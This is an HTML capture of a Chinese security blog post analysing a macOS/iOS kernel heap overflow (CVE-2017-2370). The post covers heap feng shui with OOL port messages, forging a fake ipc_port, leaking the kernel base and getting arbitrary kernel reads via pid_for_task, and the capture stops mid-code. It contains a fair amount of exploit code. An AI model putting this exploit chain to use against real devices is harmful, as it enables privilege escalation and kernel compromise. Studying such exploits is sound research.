<!DOCTYPE html>
<html lang=Ch>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x00.前言这次提权利用的是mach_voucher_extract_attr_recipe_trap存在的一个漏洞，而利用方法的核心就是通过MACH_MSG_OOL_PORTS_DESCRIPTOR消息。 
关于mach_msg ool简单来说当发送一个包含ool descriptor的msg时，内核会将指定的数据从用户空间复制到内核空间，并且内核会一直保持这部分数据，直到目标 task 处理">
<meta property="og:type" content="article">
<meta property="og:title" content="通过堆风水绕过内核保护提权">
<meta property="og:url" content="https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/index.html">
<meta property="og:site_name" content="Peterpan's Blog">
<meta property="og:description" content="0x00.前言这次提权利用的是mach_voucher_extract_attr_recipe_trap存在的一个漏洞，而利用方法的核心就是通过MACH_MSG_OOL_PORTS_DESCRIPTOR消息。 
关于mach_msg ool简单来说当发送一个包含ool descriptor的msg时，内核会将指定的数据从用户空间复制到内核空间，并且内核会一直保持这部分数据，直到目标 task 处理">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-31%20%E4%B8%8A%E5%8D%8811.42.17.png">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-28%20%E4%B8%8B%E5%8D%884.48.43.png">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-30%20%E4%B8%8B%E5%8D%882.41.22.png">
<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-30%20%E4%B8%8B%E5%8D%885.40.37.png">
<meta property="og:updated_time" content="2018-08-13T06:41:08.399Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="通过堆风水绕过内核保护提权">
<meta name="twitter:description" content="0x00.前言这次提权利用的是mach_voucher_extract_attr_recipe_trap存在的一个漏洞，而利用方法的核心就是通过MACH_MSG_OOL_PORTS_DESCRIPTOR消息。 
关于mach_msg ool简单来说当发送一个包含ool descriptor的msg时，内核会将指定的数据从用户空间复制到内核空间，并且内核会一直保持这部分数据，直到目标 task 处理">
<meta name="twitter:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-31%20%E4%B8%8A%E5%8D%8811.42.17.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/P.png">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>通过堆风水绕过内核保护提权</title>
    <!-- styles -->
    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
    <!-- jquery -->
    <script src="/lib/jquery/jquery.min.js"></script>
</head>

<body>
    <div class="banner">
<div id="blogtitel" class="blogtitel">Peterpan&#39;s Blog</div>
<ul id="wrapper" class="wrapper">
  <div class="sun">
    <div class="star"></div>
  </div>
  <div class="mercury">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="venus">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="earth">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="mars">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="jupiter">
    <div class="planet"><div class="shadow"></div></div>
  </div>
</ul>
</div>

    <div class="background">
      
        <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/Peterpan0927">Github</a></li>
         
          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/08/06/绕过SMAP提权-Mac移植/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
        
        
        <li><a class="icon" href="/2018/07/17/利用三叉戟漏洞实现本地提权/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&text=通过堆风水绕过内核保护提权"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&is_video=false&description=通过堆风水绕过内核保护提权"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=通过堆风水绕过内核保护提权&body=Check out this article: https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&name=通过堆风水绕过内核保护提权&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00.前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞产生点"><span class="toc-number">2.</span> <span class="toc-text">0x01.漏洞产生点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-利用步骤"><span class="toc-number">3.</span> <span class="toc-text">0x01.利用步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x02.参考链接</span></a></li></ol>
    </div>
  </span>
</div>

      
      <div class="content index width mx-auto px2 my4">
          
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        通过堆风水绕过内核保护提权
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Peterpan's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-07-29T05:48:21.000Z" itemprop="datePublished">2018-07-29</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="/tags/漏洞挖掘/">漏洞挖掘</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h1><p>这次提权利用的是<code>mach_voucher_extract_attr_recipe_trap</code>存在的一个漏洞，而利用方法的核心就是通过<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>消息。 </p>
<p>关于<code>mach_msg ool</code>简单来说当发送一个包含<code>ool descriptor</code>的<code>msg</code>时，内核会将指定的数据从用户空间复制到内核空间，并且内核会一直保持这部分数据，直到目标 task 处理了消息。同样，当目标进程接收一个包含<code>ool descriptor</code>的消息时，内核会将数据从内核空间复制到用户空间（不一定是真正的复制）。因此可以利用这个技术点向内核堆中写入数据或者从内核读取数据。</p>
<p>由于这个漏洞的利用比三叉戟要复杂得多，所以我就一步步的慢慢去剖析了，从漏洞的产生点到一步步的利用，代码可以参考我的<a href="https://github.com/Peterpan0927/CVE-2017-2370" target="_blank" rel="external">github</a></p>
<h1 id="0x01-漏洞产生点"><a href="#0x01-漏洞产生点" class="headerlink" title="0x01.漏洞产生点"></a>0x01.漏洞产生点</h1><p>在iOS 10和macOS 10.12中添加的新功能中有一个函数叫做<code>mach_voucher_extract_attr_recipe_trap</code>，是一个可以在沙盒内调用的<code>Mach trap</code>，下面是这个函数的源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span></div><div class="line">  mach_voucher_extract_attr_recipe_trap(<span class="keyword">struct</span> mach_voucher_extract_attr_recipe_args *args)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">ipc_voucher_t</span> voucher = IV_NULL;</div><div class="line">    <span class="keyword">kern_return_t</span> kr = KERN_SUCCESS;</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> sz = <span class="number">0</span>;</div><div class="line">	<span class="comment">//将recipe_size的地址拷贝到sz中，此时sz存放的就是kalloc_size的值了</span></div><div class="line">    <span class="keyword">if</span> (copyin(args-&gt;recipe_size, (<span class="keyword">void</span> *)&amp;sz, <span class="keyword">sizeof</span>(sz)))     &lt;---------- (a)</div><div class="line">      <span class="keyword">return</span> KERN_MEMORY_ERROR;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (sz &gt; MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)</div><div class="line">      <span class="keyword">return</span> MIG_ARRAY_TOO_LARGE;</div><div class="line"></div><div class="line">    voucher = convert_port_name_to_voucher(args-&gt;voucher_name);</div><div class="line">    <span class="keyword">if</span> (voucher == IV_NULL)</div><div class="line">      <span class="keyword">return</span> MACH_SEND_INVALID_DEST;</div><div class="line"></div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> __assert_only max_sz = sz;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (sz &lt; MACH_VOUCHER_TRAP_STACK_LIMIT) &#123;</div><div class="line">      <span class="comment">/* keep small recipes on the stack for speed */</span></div><div class="line">      <span class="keyword">uint8_t</span> krecipe[sz];</div><div class="line">      <span class="keyword">if</span> (copyin(args-&gt;recipe, (<span class="keyword">void</span> *)krecipe, sz)) &#123;</div><div class="line">        kr = KERN_MEMORY_ERROR;</div><div class="line">        <span class="keyword">goto</span> done;</div><div class="line">      &#125;</div><div class="line">      kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                                            (<span class="keyword">mach_voucher_attr_raw_recipe_t</span>)krecipe, &amp;sz);</div><div class="line">      assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (kr == KERN_SUCCESS &amp;&amp; sz &gt; <span class="number">0</span>)</div><div class="line">        kr = copyout(krecipe, (<span class="keyword">void</span> *)args-&gt;recipe, sz);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">uint8_t</span> *krecipe = kalloc((<span class="keyword">vm_size_t</span>)sz);                 &lt;---------- (b)</div><div class="line">      <span class="keyword">if</span> (!krecipe) &#123;</div><div class="line">        kr = KERN_RESOURCE_SHORTAGE;</div><div class="line">        <span class="keyword">goto</span> done;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (copyin(args-&gt;recipe, (<span class="keyword">void</span> *)krecipe, args-&gt;recipe_size)) &#123;         &lt;----------- (c)</div><div class="line">        kfree(krecipe, (<span class="keyword">vm_size_t</span>)sz);</div><div class="line">        kr = KERN_MEMORY_ERROR;</div><div class="line">        <span class="keyword">goto</span> done;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                                            (<span class="keyword">mach_voucher_attr_raw_recipe_t</span>)krecipe, &amp;sz);</div><div class="line">      assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (kr == KERN_SUCCESS &amp;&amp; sz &gt; <span class="number">0</span>)</div><div class="line">        kr = copyout(krecipe, (<span class="keyword">void</span> *)args-&gt;recipe, sz);</div><div class="line">      kfree(krecipe, (<span class="keyword">vm_size_t</span>)sz);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    kr = copyout(&amp;sz, args-&gt;recipe_size, <span class="keyword">sizeof</span>(sz));</div><div class="line"></div><div class="line">  done:</div><div class="line">    ipc_voucher_release(voucher);</div><div class="line">    <span class="keyword">return</span> kr;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<ol>
<li>通过分析我们可以知道在a点的时候4byte的用户空间指针<code>args-&gt;recipe_size</code>被写到<code>sz</code>中</li>
<li>在b点的时候，如果<code>sz</code>的大小在<code>MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE (5120)</code>和<code>MACH_VOUCHER_TRAP_STACK_LIMIT (256)</code>之间的话，就会按照<code>sz</code>的值去分配一个内核堆缓冲区</li>
<li>在c点的时候将用户空间的内存拷贝到刚刚分配的区域，但是传递的拷贝的大小并不是用来分配内核堆的<code>sz</code>，而是一个用户空间指针，于是乎就会产生一个堆溢出，我们正是利用这个点进行攻击，并且<code>copyin</code>函数有一个特性就是遇到<code>unmap</code>的页面就是停止拷贝，这个特性将会在我们的<code>poc</code>中得到利用：</li>
</ol>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-31%20%E4%B8%8A%E5%8D%8811.42.17.png" alt="copyin"></p>
<h1 id="0x01-利用步骤"><a href="#0x01-利用步骤" class="headerlink" title="0x01.利用步骤"></a>0x01.利用步骤</h1><ol>
<li>首先我们要使堆空间可控，这里我们用到的技术是堆风水，因为在<code>freelist</code>随机化之后，我们并不知道重新分配的内存块的位置了。</li>
</ol>
<p>先需要了解mach msg中对<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>的处理 ，内核收到复杂消息后发现是<code>ports descriptor</code>后会交给(called by <code>ipc_kmsg_copyin</code>)<code>ipc_kmsg_copyin_ool_ports_descriptor</code>函数读取所有的<code>port</code>对象。该函数会调用<code>kalloc</code>分配需要的内存(64位下分配的内存是输入的2倍，name的长度是4字节)，然后将有效的<code>port</code>由<code>name</code>转换成真实的<code>ipc_port</code>对象地址保存，对于输入是<code>MACH_PORT_NULL或者MACH_PORT_DEAD</code>的<code>name</code>，会保持不变。 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* calculate length of data in bytes, rounding up */</span></div><div class="line"><span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="keyword">mach_port_t</span>), &amp;ports_length)) &#123; </div><div class="line">	*mr = MACH_SEND_TOO_LARGE; </div><div class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>; </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>), &amp;names_length)) &#123; </div><div class="line">    *mr = MACH_SEND_TOO_LARGE;</div><div class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>; </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="keyword">if</span>(ports_length == <span class="number">0</span>)&#123;</div><div class="line">    <span class="keyword">return</span> user_desc;</div><div class="line">&#125;</div><div class="line"></div><div class="line">data = kalloc(ports_length); <span class="comment">// 分配空间 </span></div><div class="line">... </div><div class="line">objects = (<span class="keyword">ipc_object_t</span> *) data; </div><div class="line"></div><div class="line">dsc-&gt;address = data; </div><div class="line"></div><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; i++) &#123; </div><div class="line">    <span class="keyword">mach_port_name_t</span> name = names[i]; </div><div class="line">    <span class="keyword">ipc_object_t</span> object;</div><div class="line">    <span class="keyword">if</span> (!MACH_PORT_VALID(name)) &#123;</div><div class="line">        objects[i] = (<span class="keyword">ipc_object_t</span>)CAST_MACH_NAME_TO_PORT(name);<span class="comment">// IPC_PORT_DEAD continue; </span></div><div class="line">    &#125; </div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以攻击的时候我们会发送大量的<code>MACH_PORT_DEAD</code>，将内存区域填充为<code>0xFFFFFFFFFFFFFFFF</code>(<code>MACH_PORT_DEAD</code>)，然后触发漏洞，将其中一个<code>IPC_PORT_DEAD</code>修改为攻击者布置好的一块内存区域，如果指向的区域是一个合法的<code>ipc port</code>结构，那么在接受<code>OOL PORTS</code>消息后，就能够在用户空间得到这个<code>ipc_port</code>对应的<code>port name</code>，进行下一步攻击。 </p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-28%20%E4%B8%8B%E5%8D%884.48.43.png" alt="堆风水"></p>
<ol>
<li><code>ipc_object</code>对象的构造</li>
</ol>
<p>首先我们已经得到了这个<code>fake port</code>，接下来要进行信息泄漏就必须知道内核会根据那些参数来对它进行不同的处理，首先看看<code>ipc_port</code>的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ipc_port &#123;</div><div class="line">	<span class="comment">//ipc_object的指针就在前八个字节，是我们溢出攻击的对象</span></div><div class="line">	<span class="keyword">struct</span> ipc_object ip_object; <span class="comment">// port对象的类型 struct ipc_mqueue,ip_messages;</span></div><div class="line">	<span class="keyword">struct</span> ipc_mqueue ip_messages; <span class="comment">//消息队列</span></div><div class="line">	<span class="keyword">union</span> &#123;</div><div class="line">               <span class="keyword">struct</span> ipc_space *receiver;</div><div class="line">               <span class="keyword">struct</span> ipc_port *destination;</div><div class="line">               <span class="keyword">ipc_port_timestamp_t</span> timestamp;</div><div class="line">    &#125;data;</div><div class="line">	<span class="keyword">union</span> &#123;</div><div class="line">    	<span class="keyword">ipc_importance_task_t</span> imp_task;</div><div class="line">    	<span class="keyword">ipc_kobject_t</span> kobject; <span class="comment">// port对应的内核对象</span></div><div class="line">    	<span class="keyword">uintptr_t</span> alias;</div><div class="line">	&#125;kdata;</div><div class="line">	...</div><div class="line">&#125; __attribute__((__packed__));</div></pre></td></tr></table></figure>
<p>其中有一个port对应的内核对象，而这个<code>ipc_port</code>对应的到底是哪种类型的内核对象则是由<code>ipc_object</code>的属性来决定了，所以我们其实是针对<code>ipc_object</code>进行构造。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fakeport-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK; <span class="comment">//设置为IKOT_CLOCK对象，并处于激活状态</span></div><div class="line">fakeport-&gt;io_lock_data[<span class="number">12</span>] = <span class="number">0x11</span>;	<span class="comment">//设置port锁处于活动状态，防止死锁</span></div></pre></td></tr></table></figure>
<p>内核就会将这个<code>ipc_port</code>认作是用于<code>IKOT_CLOCK</code>对象通信的<code>port</code>，接下来的目的就是来泄漏内核基址：</p>
<p>将这个ipc_port伪造为<code>IKOT_CLOCK</code>对象，然后将其 kdata.kobject指针设置为一个内核地址。每次修改这个内核地址后，在用户空间调用<code>clock_sleep_trap</code>，内核中会调用<code>port_name_to_clock</code>得到这个内核地址， 并将其作为clock参数传 递给<code>clock_sleep_internal</code>，源码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> kern_return_t <span class="title">clock_sleep_internal</span><span class="params">( <span class="keyword">clock_t</span> clock, <span class="keyword">sleep_type_t</span> sleep_type, <span class="keyword">mach_timespec_t</span> *sleep_time)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (clock == CLOCK_NULL)</div><div class="line">      <span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</div><div class="line">    <span class="keyword">if</span> (clock != &amp;clock_list[SYSTEM_CLOCK])</div><div class="line">      <span class="keyword">return</span> (KERN_FAILURE);</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从上面的代码中可以看出如果<code>clock</code> 的地址不是<code>clock_list[SYSTEM_CLOCK]</code>的地址，就会返回<code>KERN_FAILURE</code>，否则就会返回其他的地址，那么我们就可以通过返回的参数，去做遍历(不停修改kobject的值)，直到返回<code>KERN_FAILURE</code>为止，那么我们就可以拿到<code>clock_list[SYSTEM_CLOCK]</code>在内核中的地址了，而这个地址又不在堆上，而是内核中的一个全局变量，处在一个特定的偏移。接下来就是从这个地方开始往前读每一个页面的头部，找到<code>MH_MAGIC_64</code>,也就是<code>0xfeedfacf</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> clock_ops sysclk_ops, calend_ops;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> clock clock_list[] = &#123;</div><div class="line">    &#123;&amp;sysclk_ops, <span class="number">0</span>, <span class="number">0</span>&#125;,</div><div class="line">    &#123;&amp;calend_ops, <span class="number">0</span>, <span class="number">0</span>&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ol>
<li>内核任意地址读</li>
</ol>
<p>在我们拿到了这个地址之后，就需要将我们的对象转换为<code>task</code>类型，并且找到内核的基址，这样就可以算出<code>kslide</code>，进行接下来的<code>tfp0</code>操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//将fake port的类型换成task，因为需要利用pid_for_task这个接口来进行任意地址读</span></div><div class="line">fakeport-&gt;io_bits = IKOT_TASK|IO_BITS_ACTIVE;</div><div class="line">fakeport-&gt;io_references = <span class="number">0xff</span>;</div><div class="line"><span class="keyword">char</span>* faketask = ((<span class="keyword">char</span>*)fakeport) + <span class="number">0x1000</span>;</div><div class="line">    </div><div class="line">*(<span class="keyword">uint64_t</span>*)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = faketask;</div><div class="line">*(<span class="keyword">uint64_t</span>*)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0xa0</span>) = <span class="number">0xff</span>;</div><div class="line">*(<span class="keyword">uint64_t</span>*) (faketask + <span class="number">0x10</span>) = <span class="number">0xee</span>;</div></pre></td></tr></table></figure>
<p>拿到<code>kobject</code>的地址，调整地址回到页面开头，在<code>Yalu102</code>和<code>Zheng min</code>的Poc中对于这个操作的先后是不同的，但是这个并不影响</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint64_t</span> leaked_ptr =  *(<span class="keyword">uint64_t</span>*)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>);</div><div class="line">leaked_ptr &amp;= ~<span class="number">0x3FFF</span>;</div></pre></td></tr></table></figure>
<p>然后就写一个死循环去找<code>MH_MAGIC_64</code>，然后进行我们的<code>tfp0</code>阶段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">        <span class="keyword">int</span> leaked = <span class="number">0</span>;</div><div class="line">    	*(<span class="keyword">uint64_t</span> *)(faketask + <span class="number">0x380</span>) = leaked_ptr <span class="number">-0x10</span>;</div><div class="line">        pid_for_task(foundport, &amp;leaked);</div><div class="line">        <span class="keyword">if</span> (leaked == MH_MAGIC_64) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"found kernel text at 0x%llx\n"</span>, leaked_ptr);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        leaked_ptr -= <span class="number">0x4000</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>那么为什么可以实现任意地址读，这个是因为<code>pid_for_task</code>这个函数的值没有做任何的判断，只是将传进来的参数转换成地址做一些加减运算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span> pid_for_task(<span class="keyword">struct</span> pid_for_task_args *args)&#123;</div><div class="line">	<span class="keyword">mach_port_t</span> t = args-&gt;t;</div><div class="line">    ...</div><div class="line">    t1 = port_name_to_task(t);</div><div class="line">    p = get_bsdtask_info(t1);</div><div class="line">    <span class="keyword">if</span>(p)&#123;</div><div class="line">        pid = proc_id(p);</div><div class="line">        err = KERN_SUCCESS;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    (<span class="keyword">void</span>) copyout((<span class="keyword">char</span> *)&amp;pid, pid_addr, <span 